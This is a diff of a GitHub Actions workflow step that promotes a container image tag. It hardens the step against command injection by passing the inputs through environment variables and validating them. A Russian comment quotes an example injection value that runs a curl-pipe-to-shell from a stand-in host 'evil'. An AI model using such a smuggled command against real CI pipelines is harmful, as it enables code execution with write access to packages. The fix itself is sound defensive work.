@@ -43,11 +43,18 @@ jobs:
           username: ${{ github.actor }}
           password: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: Retag ${{ inputs.source }} -> ${{ inputs.target }} (digest preserved)
+      - name: Retag (digest preserved)
+        # ДПЛ-4: входы передаём через env и используем "$SOURCE"/"$TARGET" — НЕ
+        # интерполируем ${{ inputs.* }} прямо в shell (иначе source вида
+        # `canary"; curl evil|sh; echo "` даёт инъекцию команд в раннере с
+        # packages:write). Плюс валидируем формат тега (defence in depth).
+        env:
+          SOURCE: ${{ inputs.source }}
+          TARGET: ${{ inputs.target }}
         run: |
           set -euo pipefail
-          echo "Promote ${IMAGE}:${{ inputs.source }} -> ${IMAGE}:${{ inputs.target }}"
-          docker buildx imagetools create \
-            --tag "${IMAGE}:${{ inputs.target }}" \
-            "${IMAGE}:${{ inputs.source }}"
-          echo "Готово. Флот на канале ${{ inputs.target }} подтянет образ (после cosign-проверки)."
+          case "$SOURCE" in *[!A-Za-z0-9._-]*) echo "недопустимый source: $SOURCE"; exit 1 ;; esac
+          case "$TARGET" in stable|canary) ;; *) echo "недопустимый target: $TARGET"; exit 1 ;; esac
+          echo "Promote ${IMAGE}:${SOURCE} -> ${IMAGE}:${TARGET}"
+          docker buildx imagetools create --tag "${IMAGE}:${TARGET}" "${IMAGE}:${SOURCE}"
+          echo "Готово. Флот на канале ${TARGET} подтянет образ (после cosign-проверки)."
